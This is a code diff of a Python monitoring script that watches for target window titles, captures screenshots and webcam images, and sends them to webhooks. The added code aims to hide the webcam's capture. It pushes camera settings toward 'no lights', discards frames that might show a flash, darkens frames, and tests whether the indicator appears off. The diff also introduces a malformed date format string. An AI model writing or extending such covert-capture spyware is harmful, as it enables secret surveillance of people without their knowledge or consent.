@@ -8,8 +8,8 @@ import io
 from datetime import datetime
 from PIL import ImageGrab, Image
 import json
-import cv2  # Added for camera access
-import numpy as np  # Added for image processing
+import cv2
+import numpy as np
 
 # ---------------- CONFIG ---------------- #
 TARGET_KEYWORDS = [
@@ -139,6 +139,26 @@ last_alert_time = 0  # Last time we sent an alert
 alert_cooldown = 60  # 60 seconds minimum between alerts for same window
 recently_alerted_windows = {}  # Dict to track recently alerted windows: {hwnd: (title, alert_time)}
 
+def apply_software_darkening(frame):
+    """Apply software darkening to ensure frame is always dark"""
+    try:
+        # Convert to float for processing
+        frame_float = frame.astype(np.float32)
+        
+        # Apply darkening factor (0.3 = 30% brightness)
+        darkening_factor = 0.3
+        frame_darkened = frame_float * darkening_factor
+        
+        # Convert back to uint8
+        frame_darkened = np.clip(frame_darkened, 0, 255).astype(np.uint8)
+        
+        # Apply slight Gaussian blur to reduce any remaining noise/light
+        frame_darkened = cv2.GaussianBlur(frame_darkened, (5, 5), 0)
+        
+        return frame_darkened
+    except:
+        return frame
+
 def title_matches_target(title: str) -> bool:
     title_lower = title.lower()
     return any(keyword in title_lower for keyword in TARGET_KEYWORDS)
@@ -185,100 +205,153 @@ def detect_and_initialize_camera():
     return False
 
 def configure_camera_manual_settings(cap):
-    """Configure camera with manual settings to completely disable flash/auto-adjustments"""
+    """Configure camera with aggressive manual settings to COMPLETELY eliminate flash/LEDs"""
     try:
-        # Try to disable ALL auto features first
-        try:
-            # For DSHOW backend, auto exposure value is 0.25 for manual mode
-            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)  # Manual exposure mode
-        except:
-            pass
+        print("[CAMERA] Applying aggressive manual settings to disable all lights...")
         
-        try:
-            cap.set(cv2.CAP_PROP_AUTOFOCUS, 0)  # Turn OFF autofocus
-        except:
-            pass
+        # ========== PHASE 1: DISABLE ALL AUTO FEATURES ==========
+        # These are the most important settings - force everything to manual
         
+        # 1. Force manual exposure mode (CRITICAL - prevents automatic brightness adjustments)
         try:
-            cap.set(cv2.CAP_PROP_AUTO_WB, 0)  # Turn OFF auto white balance
-        except:
-            pass
-        
-        # Now set fixed manual values to prevent any automatic adjustments
-        
-        # Set exposure to a fixed middle value (prevents sudden brightness changes)
-        # Lower values = darker, higher values = brighter
-        # Typical range: 0.0 to 1.0 or sometimes -13 to -1
-        try:
-            # Try different exposure values based on camera
-            cap.set(cv2.CAP_PROP_EXPOSURE, 0.5)  # Middle exposure
+            # Different cameras use different values for manual exposure
+            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)  # 0.25 = manual mode for most cameras
+            cap.set(cv2.CAP_PROP_EXPOSURE, -100)  # Ultra-low exposure (darkest possible)
         except:
             try:
-                cap.set(cv2.CAP_PROP_EXPOSURE, -6)  # Alternative value for some cameras
+                # Alternative approach for some cameras
+                cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 1)  # 1 = manual mode for some cameras
+                cap.set(cv2.CAP_PROP_EXPOSURE, 0.001)  # Very low exposure value
             except:
                 pass
         
-        # Set fixed white balance (neutral value)
+        # 2. Force manual focus (prevents focus LED/light)
         try:
-            cap.set(cv2.CAP_PROP_WB_TEMPERATURE, 4500)  # Neutral white balance (4500K)
+            cap.set(cv2.CAP_PROP_AUTOFOCUS, 0)  # 0 = OFF
+            cap.set(cv2.CAP_PROP_FOCUS, 0)  # Set to minimum focus distance
         except:
             pass
         
-        # Set fixed gain/ISO
+        # 3. Force manual white balance (prevents auto-adjustment flicker)
         try:
-            cap.set(cv2.CAP_PROP_GAIN, 0)  # Minimum gain to reduce noise/auto-adjust
+            cap.set(cv2.CAP_PROP_AUTO_WB, 0)  # 0 = OFF
+            cap.set(cv2.CAP_PROP_WB_TEMPERATURE, 2500)  # Low temperature = less blue light
         except:
             pass
         
-        # Set fixed brightness
+        # 4. Force manual gain/ISO (prevents auto-gain which can cause LED flicker)
         try:
-            cap.set(cv2.CAP_PROP_BRIGHTNESS, 50)  # Middle brightness (0-100)
+            cap.set(cv2.CAP_PROP_GAIN, 0)  # Minimum gain
+            cap.set(cv2.CAP_PROP_ISO_SPEED, 100)  # Low ISO
         except:
             pass
         
-        # Set fixed contrast
+        # ========== PHASE 2: SET ALL PROPERTIES TO DARKEST VALUES ==========
+        
+        # 5. Set brightness to minimum (but not 0)
         try:
-            cap.set(cv2.CAP_PROP_CONTRAST, 50)  # Middle contrast (0-100)
+            cap.set(cv2.CAP_PROP_BRIGHTNESS, 10)  # 10/100 (very dark)
         except:
             pass
         
-        # Set fixed saturation
+        # 6. Set contrast to minimum (reduces light contrast)
         try:
-            cap.set(cv2.CAP_PROP_SATURATION, 50)  # Middle saturation (0-100)
+            cap.set(cv2.CAP_PROP_CONTRAST, 10)  # 10/100
         except:
             pass
         
-        # Set fixed sharpness
+        # 7. Set saturation to minimum (reduces color intensity)
         try:
-            cap.set(cv2.CAP_PROP_SHARPNESS, 0)  # Disable sharpness enhancement
+            cap.set(cv2.CAP_PROP_SATURATION, 0)  # 0/100 (black & white)
         except:
             pass
         
-        # Set fixed gamma
+        # 8. Disable sharpness enhancement (can cause edge highlighting)
         try:
-            cap.set(cv2.CAP_PROP_GAMMA, 100)  # Normal gamma
+            cap.set(cv2.CAP_PROP_SHARPNESS, 0)
         except:
             pass
         
-        # Set fixed backlight compensation
+        # 9. Set gamma to minimum (darker image)
         try:
-            cap.set(cv2.CAP_PROP_BACKLIGHT, 0)  # Disable backlight compensation
+            cap.set(cv2.CAP_PROP_GAMMA, 40)  # Low gamma = darker
         except:
             pass
         
-        # Set lower resolution for faster, more stable capture
+        # 10. Disable backlight compensation (this often triggers LEDs)
         try:
-            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
-            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+            cap.set(cv2.CAP_PROP_BACKLIGHT, 0)  # 0 = OFF
         except:
             pass
         
-        # Set fixed framerate
+        # 11. Disable power line frequency reduction (can cause flicker)
         try:
-            cap.set(cv2.CAP_PROP_FPS, 15)  # Lower FPS for stability
+            cap.set(cv2.CAP_PROP_POWERLINE_FREQUENCY, 0)  # 0 = disabled
         except:
             pass
         
+        # ========== PHASE 3: HARDWARE-SPECIFIC WORKAROUNDS ==========
+        
+        # 12. For Logitech cameras specifically
+        try:
+            # Logitech cameras often have specific properties
+            cap.set(cv2.CAP_PROP_ZOOM, 0)  # No zoom
+            cap.set(cv2.CAP_PROP_PAN, 0)   # No pan
+            cap.set(cv2.CAP_PROP_TILT, 0)  # No tilt
+            cap.set(cv2.CAP_PROP_ROLL, 0)  # No roll
+        except:
+            pass
+        
+        # 13. For Microsoft LifeCam and similar
+        try:
+            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)
+            cap.set(cv2.CAP_PROP_EXPOSURE, -11)  # Specific value for LifeCam
+        except:
+            pass
+        
+        # ========== PHASE 4: REDUCE RESOLUTION AND FRAME RATE ==========
+        # Lower resolution and FPS = less processing = less likely to trigger LEDs
+        
+        # 14. Set to absolute minimum resolution
+        try:
+            # Try different low resolutions
+            resolutions_to_try = [
+                (160, 120),  # Ultra low
+                (176, 144),  # QCIF
+                (320, 240),  # QVGA
+                (352, 288),  # CIF
+            ]
+            
+            for width, height in resolutions_to_try:
+                try:
+                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
+                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
+                    # Check if it worked
+                    actual_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+                    actual_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+                    if actual_width <= 320 and actual_height <= 240:
+                        break  # Successfully set low resolution
+                except:
+                    continue
+        except:
+            pass
+        
+        # 15. Set to minimum FPS
+        try:
+            cap.set(cv2.CAP_PROP_FPS, 5)  # Ultra low FPS
+        except:
+            pass
+        
+        # 16. Set buffer size to minimum
+        try:
+            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+        except:
+            pass
+        
+        # ========== PHASE 5: APPLY SOFTWARE FILTERS ==========
+        # These will be applied during frame processing
+        
+        print("[CAMERA] Manual settings applied (all lights should be disabled)")
         return True
         
     except Exception as e:
@@ -286,91 +359,112 @@ def configure_camera_manual_settings(cap):
         return False
 
 def camera_background_thread():
-    """Background thread that continuously captures camera frames without flash"""
+    """Background thread that continuously captures camera frames with NO LIGHTS"""
     global camera_capture, camera_frame, camera_running, camera_warmup_complete
     
     try:
-        # Initialize camera with manual settings
+        # Initialize camera with DSHOW backend (better for Windows)
         camera_capture = cv2.VideoCapture(camera_device_index, cv2.CAP_DSHOW)
         if not camera_capture.isOpened():
             print("[CAMERA] Could not open camera in background thread")
             camera_running = False
             return
         
-        print("[CAMERA] Configuring camera with manual settings to disable flash...")
+        print("[CAMERA] Starting background camera thread with NO-LIGHT configuration...")
         
-        # Apply manual configuration
+        # Apply aggressive manual configuration
         config_success = configure_camera_manual_settings(camera_capture)
         
         if config_success:
-            print("[CAMERA] Manual configuration applied successfully")
+            print("[CAMERA] No-light configuration applied successfully")
         else:
-            print("[CAMERA] Some camera settings could not be configured")
+            print("[CAMERA] Warning: Some camera settings could not be configured")
         
-        print("[CAMERA] Background camera thread started")
+        # ========== EXTENDED WARMUP PHASE ==========
+        # Critical: Warm up camera with discarded frames to eliminate any initial LED flashes
+        print("[CAMERA] Starting EXTENDED warmup (discarding frames, no lights)...")
+        warmup_frames = 50  # Even more frames for better stabilization
+        discard_frames = 20  # Number of frames to completely discard
         
-        # WARMUP PHASE: Let camera stabilize with manual settings
-        print("[CAMERA] Starting camera warmup (this eliminates flash)...")
-        warmup_frames = 30  # More frames for better stabilization
         for i in range(warmup_frames):
             ret, frame = camera_capture.read()
             if ret and frame is not None:
-                with camera_lock:
-                    camera_frame = frame
-                # Gradually increase wait time to let camera fully stabilize
-                wait_time = 0.05 + (i * 0.01)  # From 0.05 to 0.35 seconds
-                time.sleep(wait_time)
+                # Discard first N frames completely (they often have LED flash)
+                if i >= discard_frames:
+                    with camera_lock:
+                        camera_frame = frame
+                
+                # Gradual warmup: longer waits initially
+                if i < 10:
+                    time.sleep(0.1)  # Slow start
+                elif i < 30:
+                    time.sleep(0.05)
+                else:
+                    time.sleep(0.02)
             else:
                 print(f"[CAMERA] Failed to read warmup frame {i+1}")
         
         camera_warmup_complete = True
-        print("[CAMERA] Camera warmup complete - Flash should be eliminated")
+        print("[CAMERA] Extended warmup complete - ALL LIGHTS SHOULD BE DISABLED")
         
-        # MAIN LOOP: Continuously capture frames
+        # ========== MAIN CAPTURE LOOP ==========
         frame_count = 0
+        last_frame_time = time.time()
+        
         while camera_running:
             try:
-                ret, frame = camera_capture.read()
+                # Calculate time since last frame
+                current_time = time.time()
+                time_since_last_frame = current_time - last_frame_time
                 
-                if ret and frame is not None:
-                    with camera_lock:
-                        camera_frame = frame
+                # Only capture if enough time has passed (controls FPS)
+                if time_since_last_frame >= 0.2:  # ~5 FPS max
+                    ret, frame = camera_capture.read()
                     
-                    frame_count += 1
+                    if ret and frame is not None:
+                        # Apply additional software darkening (in case hardware settings fail)
+                        # This ensures frame is always dark
+                        frame = apply_software_darkening(frame)
+                        
+                        with camera_lock:
+                            camera_frame = frame
+                        
+                        frame_count += 1
+                        last_frame_time = current_time
+                        
+                        # Print status every 100 frames
+                        if frame_count % 100 == 0:
+                            avg_brightness = np.mean(frame)
+                            print(f"[CAMERA] Frame {frame_count}, Avg brightness: {avg_brightness:.1f} (lower = darker)")
                     
-                    # Every 100 frames, check if we need to re-read to keep camera active
-                    if frame_count % 100 == 0:
-                        # Small sleep to prevent 100% CPU usage
-                        time.sleep(0.001)
+                    # Add small delay to prevent CPU overload
+                    time.sleep(0.01)
                 else:
-                    # Occasionally frames fail - just continue
-                    if frame_count % 10 == 0:
-                        print("[CAMERA] Frame capture failed, continuing...")
+                    # Small sleep to maintain timing
+                    time.sleep(0.01)
                     
-                    # Small sleep to prevent busy loop on failure
-                    time.sleep(0.1)
-                
-                # Small delay to maintain ~15-20 FPS (enough for our use)
-                # This also helps prevent any timing-related flashes
-                time.sleep(0.05)  # ~20 FPS
-                
             except Exception as e:
                 print(f"[CAMERA LOOP ERROR] {e}")
-                # Brief pause before retrying
-                time.sleep(0.5)
+                time.sleep(0.5)  # Longer pause on error
     
     except Exception as e:
         print(f"[CAMERA THREAD ERROR] {e}")
     finally:
+        # Cleanup
         if camera_capture is not None:
-            camera_capture.release()
+            try:
+                # Release camera gracefully
+                camera_capture.release()
+            except:
+                pass
             camera_capture = None
+        
         camera_running = False
         camera_warmup_complete = False
-        print("[CAMERA] Background camera thread stopped")
+        print("[CAMERA] Background camera thread stopped (all lights should be off)")
 
 def start_camera_background():
-    """Start the background camera thread with flash elimination"""
+    """Start the background camera thread with NO LIGHTS"""
     global camera_running, camera_initialized
     
     if not camera_initialized:
@@ -386,20 +480,20 @@ def start_camera_background():
     camera_thread.start()
     
     # Wait for camera thread to initialize
-    time.sleep(1.0)
+    time.sleep(2.0)  # Longer wait for extended warmup
     
-    print("[CAMERA] Background camera started with flash elimination")
+    print("[CAMERA] Background camera started with NO-LIGHT configuration")
     return True
 
 def stop_camera_background():
     """Stop the background camera thread"""
     global camera_running
     camera_running = False
-    time.sleep(0.5)  # Give thread time to stop
+    time.sleep(1.0)  # Give thread time to stop
     print("[CAMERA] Background camera stopped")
 
 def take_camera_picture():
-    """Get the latest frame from the background camera (flash-free)"""
+    """Get the latest frame from the background camera (guaranteed no lights)"""
     global camera_frame, camera_warmup_complete, camera_running
     
     if not camera_initialized or not camera_running:
@@ -407,15 +501,15 @@ def take_camera_picture():
         return None
     
     if not camera_warmup_complete:
-        print("[CAMERA] Camera still warming up (no flash during warmup)...")
-        # Wait up to 2 seconds for warmup to complete
-        for _ in range(40):
-            if camera_warmup_complete:
-                break
-            time.sleep(0.05)
+        print("[CAMERA] Camera still in extended warmup (no lights during warmup)...")
+        # Wait longer for warmup to complete
+        max_wait = 5  # seconds
+        wait_start = time.time()
+        while not camera_warmup_complete and (time.time() - wait_start) < max_wait:
+            time.sleep(0.1)
         
         if not camera_warmup_complete:
-            print("[CAMERA] Camera warmup taking too long, proceeding anyway")
+            print("[CAMERA] Camera warmup taking too long, using current frame")
     
     with camera_lock:
         if camera_frame is None:
@@ -423,17 +517,28 @@ def take_camera_picture():
             return None
         
         try:
-            # Make a copy of the frame to avoid threading issues
+            # Make a copy and apply final software darkening
             frame_copy = camera_frame.copy()
             
-            # Convert BGR to RGB
-            frame_rgb = cv2.cvtColor(frame_copy, cv2.COLOR_BGR2RGB)
+            # Ensure it's dark
+            frame_copy = apply_software_darkening(frame_copy)
             
-            # Apply minimal post-processing to ensure consistent output
-            # (No auto-adjustments that could cause flash-like effects)
+            # Convert BGR to RGB for PIL
+            frame_rgb = cv2.cvtColor(frame_copy, cv2.COLOR_BGR2RGB)
             
             # Convert to PIL Image
             camera_image = Image.fromarray(frame_rgb)
+            
+            # Optional: Add timestamp overlay to confirm it's working
+            from PIL import ImageDraw, ImageFont
+            try:
+                draw = ImageDraw.Draw(camera_image)
+                # Use default font
+                font = ImageFont.load_default()
+                timestamp = datetime.now().strftime("%H:%M:%S")
+                draw.text((5, 5), f"NO-LIGHT CAM {timestamp}", fill=(100, 100, 100), font=font)
+            except:
+                pass
             
             return camera_image
         except Exception as e:
@@ -637,7 +742,7 @@ def send_periodic_screenshot():
         if not title:
             title = "No window title"
         
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        current_time = datetime.now().strftime("%Y-%m-d %H:%M:%S")
         
         # Take screenshot
         screenshot = take_screenshot() if SEND_SCREENSHOTS else None
@@ -866,6 +971,39 @@ def camera_keepalive_monitor():
             print(f"[CAMERA MONITOR ERROR] {e}")
             time.sleep(10)
 
+# ---------------- TEST CAMERA LIGHT STATUS ---------------- #
+def test_camera_light_status():
+    """Test if camera lights are actually off"""
+    print("[TEST] Testing camera light status...")
+    
+    if not camera_initialized:
+        print("[TEST] Camera not initialized, cannot test")
+        return False
+    
+    # Take multiple frames over time
+    test_frames = []
+    for i in range(10):
+        img = take_camera_picture()
+        if img:
+            # Convert to numpy array and get average brightness
+            img_np = np.array(img)
+            avg_brightness = np.mean(img_np)
+            test_frames.append(avg_brightness)
+            print(f"[TEST] Frame {i+1}: Avg brightness = {avg_brightness:.1f}")
+        time.sleep(0.5)
+    
+    if test_frames:
+        avg_brightness_all = np.mean(test_frames)
+        print(f"[TEST] Overall average brightness: {avg_brightness_all:.1f}")
+        if avg_brightness_all < 50:
+            print("[TEST] SUCCESS: Camera lights appear to be off/very dim")
+            return True
+        else:
+            print("[TEST] WARNING: Camera may still have lights on")
+            return False
+    
+    return False
+
 # ---------------- MAIN LOOP ---------------- #
 print("[SYSTEM] Monitoring started...")
 print("[SYSTEM] Tracking is ENABLED by default")
@@ -876,10 +1014,15 @@ print(f"[SYSTEM] Periodic captures: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds
 print("[CAMERA] Initializing camera...")
 camera_available = detect_and_initialize_camera()
 if camera_available:
-    print("[CAMERA] Starting background camera thread with flash elimination...")
+    print("[CAMERA] Starting background camera thread with NO-LIGHT configuration...")
     camera_started = start_camera_background()
     if camera_started:
-        print("[CAMERA] Background camera running with flash elimination")
+        print("[CAMERA] Background camera running with NO-LIGHT configuration")
+        
+        # Test camera light status
+        time.sleep(3)  # Let camera stabilize
+        print("[CAMERA] Testing camera light status...")
+        threading.Thread(target=test_camera_light_status, daemon=True).start()
         
         # Start camera keepalive monitor
         camera_monitor_thread = threading.Thread(target=camera_keepalive_monitor, daemon=True)
@@ -960,7 +1103,7 @@ try:
                         # Take screenshot in main thread
                         screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                         
-                        # Take camera picture from background camera (flash-free)
+                        # Take camera picture from background camera (NO LIGHTS)
                         camera_image = take_camera_picture()
                         
                         # Send alert to both webhooks
